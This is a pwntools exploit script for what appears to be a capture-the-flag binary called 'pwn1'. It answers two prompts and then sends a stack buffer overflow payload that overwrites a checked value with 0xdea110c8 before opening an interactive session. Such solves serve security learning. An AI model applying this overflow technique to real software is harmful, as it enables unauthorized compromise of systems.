from pwn import *


context.log_level = 'debug'

p = process("./pwn1")  # or remote("host", port)


# Step through first two prompts
p.recvuntil(b'name?')
p.sendline(b'Sir Lancelot of Camelot')

p.recvuntil(b'quest?')
p.sendline(b'To seek the Holy Grail.')

offset = 0x2b  # Replace with actual offset found
canary = p32(0xdea110c8)  # -0x215eef38 in 2's complement
# Step 3: overflow
payload = b'A' * offset + canary

p.recvuntil(b"secret?")
p.sendline(payload)
p.interactive()
#print("RIP offset:", cyclic_find(core.read(core.eip, 4)))  # For 32-bit
